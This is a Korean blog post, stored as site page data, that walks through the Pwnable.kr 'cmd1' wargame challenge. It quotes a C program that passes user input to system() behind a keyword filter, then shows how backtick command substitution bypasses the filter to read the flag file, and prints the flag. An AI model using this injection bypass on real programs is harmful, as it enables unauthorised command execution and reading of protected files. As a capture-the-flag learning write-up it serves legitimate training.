{"componentChunkName":"component---src-templates-blog-post-tsx","path":"/articles/2016-08/Pwnable.kr-cmd1","result":{"data":{"site":{"siteMetadata":{"title":"GyeongSu Han's Github Pages","author":"@micalgenus","siteUrl":"https://micalgenus.github.io"}},"markdownRemark":{"id":"ea4e7841-0995-552f-a0a0-9142eff39653","html":"<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">cmd1@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span>$ cat cmd1<span class=\"token punctuation\">.</span>c\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> r<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    r <span class=\"token operator\">+=</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    r <span class=\"token operator\">+=</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    r <span class=\"token operator\">+=</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"tmp\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> r<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PATH=/fuckyouverymuch\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>flag, sh, tmp라는 문자열을 필터링하는 문제이다. 하지만 이 문제는 system함수를 사용하므로 쉘의 기능을 이용하는걸 생각해 보아야 한다.</p>\n<p><code><b><code class=\"language-text\">command</code></b></code> 를 할 경우 command를 실행한 후 그 프로그램의 <code class=\"language-text\">stdout</code>으로 나오는 내용을 쉘에서 실행하게 된다.</p>\n<p>간단한 예제로 보게되면 다음과 같은 결과를 낼 수 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">cmd1@ubuntu:~$ <span class=\"token variable\"><span class=\"token variable\">`</span>/bin/cat<span class=\"token variable\">`</span></span>\n<span class=\"token function\">ls</span>\n^D\ncmd1  cmd1.c  flag</code></pre></div>\n<p><strong><code class=\"language-text\"></code></strong>으로 감싼 cat을 실행할 때, cat은 입력을 그대로 출력한다.</p>\n<p>그로인해 <code class=\"language-text\">ls</code>를 입력했는데, 이 내용이 <code class=\"language-text\">cmd1@ubuntu:~$ ls</code> 와 같이 수행되게 된다. 이를 이용하여 문제를 해결해 보도록 하겠다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">cmd1@ubuntu:~$ ./cmd1 <span class=\"token string\">\"\\<span class=\"token variable\"><span class=\"token variable\">`</span>/bin/cat<span class=\"token punctuation\">\\</span><span class=\"token variable\">`</span></span>\"</span>\n/bin/cat /home/cmd1/flag\nmommy now I get what <span class=\"token environment constant\">PATH</span> environment is <span class=\"token keyword\">for</span> <span class=\"token builtin class-name\">:</span><span class=\"token punctuation\">)</span></code></pre></div>","frontmatter":{"categories":["Wargame"],"title":"Pwnable.kr cmd1","date":"Aug 21, 2016","tags":["Pwnable.kr"]}}},"pageContext":{"comments":true,"previous":{"frontmatter":{"path":"/articles/2016-07/struct-초기화","title":"Struct 초기화","comments":true}},"next":{"frontmatter":{"path":"/articles/2016-08/Pwnable.kr-cmd2","title":"Pwnable.kr cmd2","comments":true}}}}}